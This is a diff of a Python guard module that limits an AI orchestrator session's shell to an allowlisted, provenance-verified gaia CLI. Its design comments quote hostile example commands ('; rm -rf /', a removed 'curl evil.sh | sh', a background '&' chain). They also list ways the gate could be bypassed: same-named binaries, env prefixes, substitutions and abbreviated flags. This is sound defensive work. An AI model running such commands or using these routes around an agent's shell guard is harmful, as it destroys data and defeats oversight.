@@ -17,28 +17,20 @@ and bounded shapes for coordinator-owned writes.
 Design decision 1 -- keyed by ROLE, never by agent NAME
 ---------------------------------------------------------
 ``delegate_mode.classify_session_role`` is the taxonomy this module reuses,
-not reimplements. Its own docstring states the hard reason a name comparison
-is unsafe here: an EMPTY ``agent_type`` also classifies as
-``SessionRole.ORCHESTRATOR`` (``classify_session_role`` treats "no agent_type
-at all" the same as "named as the orchestrator", because Gaia's own installer
-writes ``agent: gaia-orchestrator`` into settings, and the harness surfaces
-that as ``agent_type`` -- but a session that never got that field populated
-for any reason is STILL the orchestrator's own main thread, not a stranger).
+not reimplements. It classifies an EMPTY ``agent_type`` as
+``SessionRole.ORCHESTRATOR`` too: Gaia's installer writes
+``agent: gaia-orchestrator`` into settings, and a main thread whose name field
+never arrived is still the orchestrator's own.
 
-A guard written as ``agent_type == "gaia-orchestrator"`` reads that absence
-backwards: no match means "not the orchestrator", so the restriction never
-fires, and the very session this guard exists to constrain runs unrestricted
-the moment the name field is missing, renamed, or never wired through by some
-future refactor. That is failing OPEN on a security gate -- the worst
-direction a gate can fail. Reusing ``classify_session_role`` instead of a
-literal string keeps this guard correct by construction: whatever the harness
-sends, the SAME three-way classification used everywhere else in Gaia
-(SUBAGENT / ORCHESTRATOR / NAMED_SPECIALIST) decides who this is, and an
-absent field lands on the side that gets gated, not the side that gets a free
-pass. This is also why ``check()`` below takes the raw ``hook_payload`` dict
-rather than a pre-extracted ``is_orchestrator`` boolean: any intermediate
-flattening is one more place the same "empty field reads as false" mistake
-could be reintroduced between the harness and this guard.
+A guard written as ``agent_type == "gaia-orchestrator"`` would read that
+absence as "not the orchestrator", so the restriction would never fire for the
+very session it exists to constrain: failing OPEN on a security gate. Reusing
+``classify_session_role`` puts whatever the harness sends through the same
+three-way classification (SUBAGENT / ORCHESTRATOR / NAMED_SPECIALIST) used
+everywhere else in Gaia, and an absent field lands on the gated side. This is
+also why ``check()`` below takes the raw ``hook_payload`` dict rather than a
+pre-extracted ``is_orchestrator`` boolean: a flattening step is a place the
+"empty field reads as false" mistake could return.
 
 NAMED_SPECIALIST and SUBAGENT are deliberately NOT restricted here -- the
 task this guard exists for is scoped to the orchestrator role alone. A
@@ -51,34 +43,15 @@ delegate mode already owns.
 
 Design decision 2 -- identity is PACKAGE PROVENANCE, not a path
 --------------------------------------------------------------------------
-``subagent_memory_write_guard.py`` (the structural precedent for this module)
-resolves the invoked binary by BASENAME: it strips a token down to its last
-path component and compares that to the literal string ``"gaia"``. That is
-adequate for its own purpose (deciding whether a `gaia memory <verb>` shape
-is present anywhere in the command, as a shape check), but it is exactly the
-wrong tool for an identity check, and this module is forbidden from copying
-it for that reason: ANY file named ``gaia`` anywhere on the filesystem --
-``/tmp/x/gaia``, a script dropped in the workspace, a shadowing entry earlier
-on ``$PATH`` -- has the basename ``gaia`` and would satisfy that comparison.
-A guard whose entire job is "only the real gaia CLI may run" cannot itself be
-fooled by a same-named file; that would be a key left under the doormat.
-
-The first design overcorrected in the opposite direction: it realpath'd the
-invoked token and required EXACT equality against the one ``bin/gaia`` that
-ships alongside this very hook module (computed from ``__file__``). That
-equality is a property of a LAYOUT, not of identity, and a live install
-disproved it: a real workspace runs the hook module out of the installed
-pnpm dev-pack under ``node_modules`` (``.claude/hooks`` symlinks there),
-while the ``$PATH`` launcher is an npm-global symlink chain that resolves to
-the SOURCE TREE's ``bin/gaia`` -- two genuine, simultaneously installed
-copies of the same package, two distinct real paths, so the guard denied the
-legitimate CLI, including its own. Multiple concurrent genuine installs are
-the NORMAL condition of this workspace (the ``.pnpm`` store carries one new
-hash-named package root per dev-pack build), which also rules out the
-obvious repair of a trusted-locations SET: any enumerated set is stale after
-the next ``pack``, on the next machine, and for the next layout -- it rots
-by construction, and a rotten allowlist on a security gate fails open or
-fails useless.
+A basename comparison is the wrong tool for an identity check: ANY file named
+``gaia`` anywhere on the filesystem -- ``/tmp/x/gaia``, a script dropped in
+the workspace, a shadowing entry earlier on ``$PATH`` -- has the basename
+``gaia``. Exact equality with the ``bin/gaia`` that ships beside this hook
+module is a property of a LAYOUT, not of identity: a workspace routinely holds
+several genuine installs of the same package (the hook module under an
+installed ``node_modules`` copy, the ``$PATH`` launcher resolving into the
+source tree), and any enumerated set of trusted locations is stale after the
+next build, on the next machine, and for the next layout.
 
 So identity is verified by PROVENANCE: *the trusted gaia CLI is any file
 that a genuinely installed gaia package -- the same npm package this hook
@@ -96,6 +69,9 @@ module itself ships in, by name -- declares as its own ``gaia`` executable.*
      compound-cwd threading, out of this module's scope) -- resolving a
      relative token would mean guessing a cwd this module cannot verify.
      Both are rejected outright rather than approximated.
+     ``BashValidator._resolve_bare_gaia_token_for_guard`` rewrites a typed bare
+     ``gaia`` to its ``$PATH``-resolved absolute path before calling
+     ``check()``, so the identity check below still decides.
   2. The absolute token is resolved with ``os.path.realpath`` (follows every
      symlink in the chain) to a real file R. R must exist.
   3. Walking UP from R, the NEAREST directory containing a ``package.json``
@@ -117,89 +93,45 @@ module itself ships in, by name -- declares as its own ``gaia`` executable.*
 
   Steps 2-5 fail closed on every doubt: unreadable or unparseable manifest,
   name mismatch, missing/odd ``bin`` field, ``bin`` resolving elsewhere, and
-  any ``OSError`` all deny. A pnpm-global SHELL-SHIM launcher (pnpm writes a
-  wrapper script, not a symlink, so its realpath is the shim itself, inside
-  no gaia package) is also denied by construction -- fail closed; the lane
-  there is to invoke the installed package's own ``bin/gaia`` path.
+  any ``OSError`` all deny. A pnpm-global SHELL-SHIM launcher (a wrapper
+  script, not a symlink, so its realpath is the shim itself, inside no gaia
+  package) is also denied; invoke the installed package's own ``bin/gaia``
+  path instead.
 
-  Deliberately NOT chosen: content identity (hashing the invoked file
-  against the sibling ``bin/gaia``). Two genuine installs need not be the
-  same VERSION -- the incident layout ran dev-pack hooks against a launcher
-  resolving into the source tree, and a stable-global-launcher-plus-dev-tree
-  mix is routine -- so byte equality would re-break every mixed-version
-  layout the day ``bin/gaia`` changes at all: the same "property of the
-  layout mistaken for identity" bug, re-expressed as a property of the
-  release cadence.
+  Content identity (hashing the invoked file against the sibling ``bin/gaia``)
+  is not used: two genuine installs need not be the same version.
 
-  Stated residual, within this guard's threat model: provenance reads the
-  filesystem, so an actor who can WRITE the filesystem could fabricate a
-  package tree that passes it. That actor is outside this guard's model --
-  the orchestrator lane this module gates has no file-writing tool (that is
-  delegate mode's job) and the allowlisted gaia verbs write rows, not files;
-  and the fabrication power is exactly the power that already defeated the
-  old design (overwriting the single trusted ``bin/gaia`` IN PLACE passed
-  the path-equality check, which never looked at content either). Provenance
-  narrows what passes without conceding anything path equality actually
-  held.
+  Residual: provenance reads the filesystem, so an actor who can WRITE the
+  filesystem could fabricate a package tree that passes it. That actor is
+  outside this guard's model, since the orchestrator lane has no file-writing
+  tool (that is delegate mode's job).
 
-  A useful side effect of requiring an EXACT absolute-path match at the
-  binary position: it also closes the env-prefix vector named in the task
-  (``VAR=value gaia ...``, or ``env VAR=value gaia ...``) WITHOUT a separate
-  peel-and-inspect step. ``mutative_verbs._peel_leading_env_prefix`` exists
-  because the T3 classifier WANTS to see past such a prefix to classify the
-  real command underneath -- peeling is the right move for a classifier that
-  must still make a decision about whatever remains. This guard's job is the
-  opposite: nothing may precede the trusted binary at all. Tokenizing
-  ``FOO=bar /abs/path/bin/gaia contract view`` places the assignment
-  ``"FOO=bar"`` (not a path at all) at position 0, so the absolute-path
-  requirement in step 1 rejects it on its own, before provenance is even
-  consulted. Peeling and then re-checking would only add a second code path
-  to keep in sync with the first; the identity check alone already covers
-  the shape the task calls out.
+  Requiring an absolute path at the binary position also rejects the
+  env-prefix vector (``VAR=value gaia ...``, ``env VAR=value gaia ...``) with
+  no peel step: the assignment sits at position 0 and is not a path.
+  ``mutative_verbs._peel_leading_command_wrappers`` peels such prefixes because
+  the classifier must see past them; this guard admits nothing before the
+  trusted binary.
 
 Design decision 3 -- every COMPONENT and every SUBSTITUTION BODY is checked
 -------------------------------------------------------------------------------
-Looking only at the first token of a command is exactly the mistake this
-module is told not to make. A composed command
-(``gaia contract view; rm -rf /``, ``gaia contract view && curl evil.sh | sh``)
-runs MULTIPLE programs; approving the whole string because its first word is
-the trusted binary would let every later component ride along ungated. This
-module reuses ``StageDecomposer`` (``modules.tools.stage_decomposer``, already
-the shared, tested primitive for this exact job across ``bash_validator`` and
-``cloud_pipe_validator``) to split a raw command into its operator-linked
-``Stage``s (``|``, ``;``, ``&&``, ``||``, newline) and to extract every
-``$(...)``/backtick command-substitution BODY. Every stage is checked
+A composed command (``gaia contract view; rm -rf /``) runs MULTIPLE programs,
+so every ``Stage`` that ``StageDecomposer`` (``modules.tools.stage_decomposer``)
+yields -- split on ``|``, ``;``, ``&&``, ``||``, newline and a lone ``&`` -- is checked
 independently against the SAME rule (trusted absolute binary + allowlisted
-verb phrase) -- there is no "first component is trusted, so the rest ride
-along" shortcut anywhere in this module.
+verb phrase); no component vouches for the rest.
 
-Command substitution is handled by outright denial, not by recursively
-"clearing" the body. A stage that contains ``$(...)``, `` `...` ``, or a
-process-substitution opener (``<(``, ``>(``) is denied even if the text
-inside the parens/backticks would, on its own, also be a perfectly
-allowlisted gaia invocation -- because the mere PRESENCE of a substitution
-means the shell executes something else to compute a string handed to the
-component the guard is inspecting, which is no longer "exclusively the gaia
-CLI" regardless of what that something else happens to be. This is a
-deliberately conservative reading of "closed by default": it never asks
-"is the hidden command also fine?", because answering that question requires
-trusting one more layer of shell semantics this guard would rather not model.
+A command carrying ``$(...)``, a backtick, or a process-substitution opener
+(``<(``, ``>(``) is denied even when the body would itself be an allowlisted
+gaia invocation: the shell would execute something else to compute a string
+handed to the component the guard is inspecting.
 
-``StageDecomposer`` splits on ``|``, ``;``, ``&&``, ``||`` and newline, but --
-by its own documented scope -- NOT on a bare background ``&`` (only the
-two-character ``&&``). A lone ``&`` left unhandled would let
-``gaia contract view & rm -rf /`` slip through as one "stage" whose trailing
-tokens (``&``, ``rm``, ``-rf``, ``/``) look like harmless extra arguments to
-the phrase-matching step below, because that step only checks a PREFIX of the
-non-flag tokens and does not care what comes after. Modifying
-``stage_decomposer.py`` to close that gap is out of this module's scope (this
-task creates one file and touches nothing else), so this module carries its
-own small, quote-and-substitution-aware scan for a bare ``&`` and denies the
-whole command outright if one is found -- duplicated logic, deliberately,
-rather than a shared file edited under a task that forbids editing it. That
-scan is an allowlist of literal characters, not a list of shell forms: the lane
-is one invocation, not a shell, so redirects, comments, escapes and expansions
-are impossible by construction rather than recognized one by one.
+Phrase matching checks only a PREFIX of a stage's non-flag tokens, so a shell
+form left inside a stage must not be able to ride behind an allowlisted verb.
+``_find_composition_hazard`` therefore scans the command against an allowlist
+of literal characters, not a list of shell forms: the lane is one invocation,
+not a shell, so redirects, comments, escapes, expansions and a background
+``&`` are refused by construction.
 
 Design decision 4 -- flag-level policy, because a phrase cannot express it
 --------------------------------------------------------------------------------
@@ -220,31 +152,18 @@ are this guard's business, in two layers applied in ``_check_stage``:
     the denial can say why. It is a rationale layer; the safe table already
     excludes the flag.
 
-Two properties of the flag scan are load-bearing, and both were measured
-against argparse rather than assumed:
+Two properties of the flag scan are load-bearing:
 
   * A forbidden flag matches by PREFIX of the flag, not by equality.
-    ``allow_abbrev`` defaults to True and gaia's parsers do not disable it,
-    so ``gaia doctor --fi`` and ``gaia doctor --f`` both parse to
-    ``fix=True``. An equality check on ``"--fix"`` would have failed open on
-    the two shortest spellings of the flag it exists to stop -- the same
-    shape of hole as a classification entry that is present but unreachable.
+    ``gaia doctor``'s parser leaves ``allow_abbrev`` at its default True, so
+    ``gaia doctor --fi`` and ``gaia doctor --f`` both parse to ``fix=True``.
   * The ``--flag=value`` form is split on its first ``=`` before matching, so
-    ``--fix=true`` is recognized as ``--fix`` (argparse itself rejects that
-    spelling for a store_true option, but the guard must not be the layer
-    that depends on that), while ``--workspace=--fix`` is recognized as
-    ``--workspace`` carrying a value and is NOT a false positive.
+    ``--fix=true`` is recognized as ``--fix`` while ``--workspace=--fix`` is
+    recognized as ``--workspace`` carrying a value and is NOT a false positive.
 
-Deliberately NOT built here: the mirror table of REQUIRED flags. An earlier
-design admitted ``gaia scan`` only with ``--dry-run``, which needed one --
-and needed it to survive ``gaia scan --workspace me -- --dry-run``, where a
-bare ``--`` demotes the flag to a positional and the command writes anyway.
-That whole class of parsing subtlety disappeared with the policy it served:
-``scan`` refreshes the workspace substrate the orchestrator coordinates
-from, its identity already authorizes the CLI, and requiring a flag would
-have removed a capability it needs without adding any safety. The verb is
-admitted as a write in ``ALLOWED_WRITE_PHRASES`` with every option in
-``_KNOWN_SAFE_FLAGS``, and no option is required.
+No table of REQUIRED flags exists: ``gaia scan`` is admitted as a write in
+``ALLOWED_WRITE_PHRASES`` with every option in ``_KNOWN_SAFE_FLAGS``, and no
+option is required.
 
 Scope of the check (categorical, NOT approvable)
 --------------------------------------------------
@@ -254,11 +173,10 @@ lifts it. An orchestrator session has no legitimate reason to run a command
 this guard rejects; the correct move is to dispatch a specialist, not to seek
 consent for a wider shell.
 
-This module IS wired into ``bash_validator.py``: ``BashValidator.validate()``
-calls ``check()`` here as Phase 0, the very first statement of ``validate()``,
-ahead of the empty-command check, footer stripping, the three write guards,
-and normalization. The guard is live: delegate mode grants Bash only to the
-orchestrator role, and Phase 0 evaluates its raw command.
+``BashValidator.validate()`` calls ``check()`` as Phase 0 whenever it has a
+``hook_payload``, ahead of the empty-command check, the host consent verb
+guard, footer stripping and the write guards. Delegate mode gives the
+orchestrator role a Bash grant of its own (``_orchestrator_bash_is_allowed``).
 
 Public API:
     TRUSTED_PACKAGE_NAME: Optional[str]
@@ -280,10 +198,6 @@ import re
 from typing import Any, Dict, FrozenSet, Optional, Tuple
 
 from ..tools.stage_decomposer import StageDecomposer
-
-# ---------------------------------------------------------------------------
-# Trusted binary identity (Design decision 2 -- see module docstring)
-# ---------------------------------------------------------------------------
 
 # The real, on-disk directory containing THIS file, with every symlink in the
 # chain resolved -- so the package root below is the root of whichever real
@@ -403,32 +317,20 @@ def is_trusted_gaia_binary(token: str) -> bool:
         return False
 
 
-# ---------------------------------------------------------------------------
-# Verb allowlists (Design decision "closed by default")
-# ---------------------------------------------------------------------------
-# Each entry is the exact token sequence of a subcommand PATH as gaia's own
-# argparse subparsers name it (verified against bin/cli/*.py's add_parser
-# calls, not guessed from convention) -- e.g. ("task", "gate", "list") for
-# the three-level ``gaia task gate list``. Matching is by PREFIX against the
-# tokens that follow the trusted binary (see match_allowed_phrase): anything
-# after a matched phrase (an id, a search string, a per-command flag) is
-# gaia's own argument grammar and is not re-validated here.
+# Each entry is the token sequence of a subcommand path as gaia's argparse
+# subparsers name it, e.g. ("task", "gate", "list") for ``gaia task gate list``.
+# Matching is by PREFIX against the tokens that follow the trusted binary (see
+# match_allowed_phrase); the flag gates in _check_stage then check the options,
+# and ids and search strings are left to gaia's own argument grammar.
 
 ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     # `contract view`/`list`/`validate` were verified read-only by following
     # what `bin/cli/contract.py`'s `cmd_view`/`cmd_list`/`cmd_validate` CALL:
     # no INSERT/UPDATE/DELETE and no commit() reachable from any of the
-    # three. `view`'s case needed a second look, and it used to fail it: with
-    # no draft file on disk, `cmd_view`'s default `_load_target_draft(args)`
-    # (`allow_adopt=True`) reached `_maybe_adopt_draft`, which SAVED a fresh
-    # `_initial_envelope` to `contract_drafts/<id>.json` -- a real write to
-    # disk, performed by a verb this allowlist classified as a read. Fixed:
-    # `cmd_view` now resolves with `allow_adopt=False` and never calls
-    # `_maybe_adopt_draft` at all; when no draft file exists it recovers the
-    # row's `raw_handoff_json` through `_freshest_envelope` (read-only,
-    # shared with `--harness-id` addressing) instead of fabricating and
-    # persisting a blank one. `view` is pure read again, and this comment
-    # reflects that fixed state, not the one measured before it.
+    # three. `cmd_view` resolves its draft with `allow_adopt=False`, so it never
+    # reaches `_maybe_adopt_draft`; when no draft file exists it recovers the
+    # row's `raw_handoff_json` through `_freshest_envelope` (read-only) instead
+    # of saving a blank draft.
     ("contract", "view"),
     ("contract", "list"),
     ("contract", "validate"),
@@ -477,21 +379,16 @@ ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     ("approvals", "question"),
     ("approvals", "history"),
     ("approvals", "stats"),
-    # Substrate and installation diagnostics. Each was verified read-only by
-    # following what it CALLS, not by grepping the module it lives in: no
-    # INSERT/UPDATE/DELETE and no commit() in bin/cli/{doctor,status,defects,
-    # query}.py, and the read handlers of the four grouped commands
-    # (context._cmd_show/_cmd_get, workspace._cmd_current/_cmd_info,
-    # evidence._cmd_show/_cmd_list)
+    # Substrate and installation diagnostics: bin/cli/{doctor,status,defects,
+    # query}.py and the read handlers of context (_cmd_show/_cmd_get),
+    # workspace (_cmd_current/_cmd_info) and evidence (_cmd_show/_cmd_list)
     # reach the substrate only through gaia.store.reader / gaia.store.provider.
-    # Grepping alone is not enough here: `paths` has no mutation marker in its
-    # own module and still writes, one call down, which is why it sits in the
-    # WRITE set below.
+    # The module alone does not settle it: `paths` has no mutation marker in
+    # its own module and still writes one call down, so it sits in the WRITE
+    # set below.
     #
-    # ``doctor`` is the one exception to "the verb decides": it is read-only
-    # EXCEPT under --fix, which is why it also appears in
-    # _READ_PHRASE_FORBIDDEN_FLAGS below. Prefix matching cannot express that
-    # on its own -- see Design decision 4.
+    # ``doctor`` is read-only EXCEPT under --fix, which is why it also appears
+    # in _READ_PHRASE_FORBIDDEN_FLAGS below (Design decision 4).
     ("doctor",),
     ("now",),
     ("map",),
@@ -501,44 +398,26 @@ ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     ("query",),
     ("context", "show"),
     ("context", "get"),
-    # `get-contract` is the ONLY verb that can read a project-context
-    # contract row (project_context_contracts, the same names an agent's
-    # can_read/can_write kernel menu carries) -- a DIFFERENT namespace from
-    # `show`/`get`'s workspace-shape --section. Verified read-only by
-    # following what `bin/cli/context.py`'s `_cmd_get_contract` calls: two
-    # SELECTs against `project_context_contracts` and nothing else -- no
-    # INSERT/UPDATE/DELETE, no commit() reachable. Its own docstring states
-    # the same: "Never mutates project_context_contracts -- the only write
-    # path for that table is `move-contracts` (re-keying)", which stays in
-    # EXPLICITLY_DENIED_PHRASES below, untouched by this entry.
+    # `get-contract` is the ONLY verb that reads a project-context contract row
+    # (project_context_contracts, the names an agent's can_read/can_write kernel
+    # menu carries) -- a different namespace from the workspace-shape --section
+    # of `show`/`get`. `_cmd_get_contract` only SELECTs from that table; its
+    # sole write path, `move-contracts`, stays in EXPLICITLY_DENIED_PHRASES.
     ("context", "get-contract"),
     # `project` is the one-project ficha: `projects` row + `project_facets` +
     # the matching `project_identity` contract entry + a curated-memory INDEX
-    # (slug + description, never a body). Verified read-only by following
-    # what `bin/cli/context.py`'s `_cmd_project` calls: SELECTs against
-    # `projects`, `project_facets`, `project_context_contracts` and `memory`
-    # and nothing else -- no INSERT/UPDATE/DELETE, no commit(), no telemetry
-    # bump (unlike `memory show`'s deliberate_count, deliberately not called
-    # here so this verb's own invariant -- "never writes" -- holds without
-    # exception). This closes the gap named in the task that added it: facets
-    # are not in `get_context()`'s workspace shape, are not a
-    # project-context contract themselves, and `query` (raw SQL) is denied to
-    # the orchestrator -- so before this entry there was no read path to a
-    # project's facets in this lane at all.
+    # (slug + description, never a body). `_cmd_project` only SELECTs and does
+    # not bump telemetry (unlike `memory show`), and it is the only read path
+    # to a project's facets in this lane: they are not in `get_context()`'s
+    # workspace shape.
     ("context", "project"),
     ("workspace", "current"),
     ("workspace", "info"),
     ("evidence", "show"),
     ("evidence", "list"),
-    # `session preview` exists precisely so the orchestrator can render
-    # build_session_context()'s output in-process instead of closing and
-    # reopening a session to see a manifest edit take effect (see
-    # bin/cli/session.py's module docstring). Verified read-only by
-    # following `_cmd_preview`: it calls build_session_context() and
-    # print()s the result -- no injection side effects (no session
-    # bookkeeping, no telemetry, no DB write) and no INSERT/UPDATE/DELETE
-    # reachable. Denying it would leave the verb built for the orchestrator
-    # unreachable by the orchestrator.
+    # `session preview` lets the orchestrator render build_session_context()'s
+    # output in-process instead of reopening a session to see a manifest edit
+    # take effect; `_cmd_preview` only prints it.
     ("session", "preview"),
     # Reads one session's ledger (gaia.session_ledger.build_ledger): SELECTs
     # and file reads of the stored ledger, the hand note and worktree sidecars.
@@ -633,9 +512,9 @@ ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
     ("memory", "move"),
     ("memory", "link"),
     ("memory", "checkpoint"),
-    # Withdrawal (D5 of brief aprobaciones-agnosticas-al-host): the coordinator
-    # may reject or revoke an approval it can see going stale, because both only
-    # take back consent Gaia issued. Granting stays out: `approve` is denied below.
+    # Withdrawal: the coordinator may reject or revoke an approval it can see
+    # going stale, because both only take back consent Gaia issued. Granting
+    # stays out: `approve` is denied below.
     ("approvals", "reject"),
     ("approvals", "revoke"),
     # The phrased request a main-session T3 denial points to: it only stores
@@ -646,8 +525,8 @@ ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
 ALLOWED_PHRASES: FrozenSet[Tuple[str, ...]] = ALLOWED_READ_PHRASES | ALLOWED_WRITE_PHRASES
 
 # What the orchestrator runs instead of a denied binary, keyed by basename. A
-# forge line routes to a specialist's evidence and never names a forge verb
-# (D115); the clock line never names a relative reminder form (D118).
+# forge line routes to a specialist's evidence and never names a forge verb;
+# the clock line never names a relative reminder form.
 _CLOCK_INSTEAD = "read the time with `gaia now` and compute an absolute --at from it."
 _FORGE_INSTEAD = (
     "PR/CI state is a specialist's evidence: dispatch the owning specialist "
@@ -780,11 +659,6 @@ def match_allowed_phrase(
     return None
 
 
-# ---------------------------------------------------------------------------
-# Composition hazards StageDecomposer does not surface on its own
-# (Design decision 3 -- see module docstring)
-# ---------------------------------------------------------------------------
-
 _UNQUOTED_PUNCTUATION = frozenset(" \t\n_./:=@,+%-")
 
 
@@ -868,29 +742,18 @@ def _find_composition_hazard(command: str) -> Optional[str]:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Role gate (Design decision 1 -- see module docstring)
-# ---------------------------------------------------------------------------
-
 def is_orchestrator_role(hook_payload: Dict[str, Any]) -> bool:
     """Return True iff *hook_payload* classifies as the ORCHESTRATOR role.
 
     Delegates entirely to ``delegate_mode.classify_session_role`` -- the one
     place Gaia's (agent_id, agent_type) taxonomy lives -- rather than
-    inspecting either field directly here. Imported lazily (function-local),
-    matching the convention already used at this module's real call site
-    (``hooks/adapters/claude_code.py`` imports
-    ``modules.orchestrator.delegate_mode`` the same way) and avoiding any
-    import-order assumption between the two packages.
+    inspecting either field directly here. The import is function-local so
+    neither package has to finish initializing before the other.
     """
     from ..orchestrator.delegate_mode import SessionRole, classify_session_role
 
     return classify_session_role(hook_payload) is SessionRole.ORCHESTRATOR
 
-
-# ---------------------------------------------------------------------------
-# Main entry point
-# ---------------------------------------------------------------------------
 
 def check(
     command: str,
@@ -984,17 +847,11 @@ def _check_stage(stage) -> Tuple[bool, Optional[str]]:
 
     rest = args[1:]
 
-    # Bare `gaia` (no subcommand at all) and `-h`/`--help` ANYWHERE in the
-    # remaining tokens are unconditionally read -- see _is_help_or_bare_stage
-    # for why this is provably safe rather than merely convenient, including
-    # on an otherwise-mutative verb (`gaia install --help`): argparse's own
-    # help action fires eagerly during parsing and exits before any
-    # subcommand handler ever runs, so the underlying write never executes
-    # either way. Checked BEFORE the allowlist/deny-list so the orchestrator's
-    # own contract (mechanical reads, including "what can I even run") is
-    # never blocked by the verb it is trying to look up -- and so the error
-    # message below, which recommends `gaia --help`, never recommends a
-    # command that is itself denied.
+    # Bare `gaia` and `-h`/`--help` anywhere in the remaining tokens are reads,
+    # even on a mutative verb (`gaia install --help`): argparse's help action
+    # exits during parsing, before any handler runs. Checked before the
+    # allowlist and deny-list so the denial below, which recommends
+    # `gaia --help`, never recommends a command that is itself denied.
     if _is_help_or_bare_stage(rest):
         return True, None
 
@@ -1044,10 +901,10 @@ _HELP_LONG_FLAG = "--help"
 def _is_help_token(token: str) -> bool:
     """True iff *token* is, or unambiguously abbreviates, `-h`/`--help`.
 
-    Mirrors `_forbidden_flag_hit`'s already-verified-against-argparse
-    abbreviation handling (`allow_abbrev` defaults True, and a parser that
-    turns it off only makes the match stricter) rather than inventing a second one: `--hel`/`--he`
-    parse to the help action exactly as `--fi`/`--f` parse to `--fix` there.
+    Abbreviation follows argparse's default `allow_abbrev=True`, as in
+    `_forbidden_flag_hit` (a parser that turns it off only makes the match
+    stricter): `--hel`/`--he` parse to the help action as `--fi`/`--f` parse
+    to `--fix` there.
     The `=value` split via `_option_name` also means a token like
     `--description=--help` (a VALUE that merely looks like the flag, verified
     empirically to NOT trigger argparse's help action) correctly does not
@@ -1080,9 +937,6 @@ def _is_help_or_bare_stage(rest: Tuple[str, ...]) -> bool:
     return any(_is_help_token(token) for token in rest)
 
 
-# ---------------------------------------------------------------------------
-# Flag-level policy for admitted read verbs (Design decision 4)
-# ---------------------------------------------------------------------------
 # A phrase is matched by PREFIX, so admitting ("doctor",) admits every token
 # that follows it -- including a flag that changes what the verb DOES. This
 # table is how a read verb that becomes a writer under one flag is expressed.
@@ -1649,9 +1503,9 @@ def _validate_orchestrator_write(
         # this spelling reaches it.
         return _explicitly_denied_reason(("memory", "add", "--replace"))
     else:
-        # Memory's curator verbs, the two `scan` spellings and `paths` retain
-        # their own mature CLI validation -- there is no coordination-shaped
-        # subset of them for this guard to enforce.
+        # No coordination-shaped subset to enforce here (memory writes, the two
+        # `scan` spellings, `paths`, proposal accept/dismiss, `approvals
+        # request-set`): their own CLI validation and the flag gates apply.
         return None
 
     if valid:
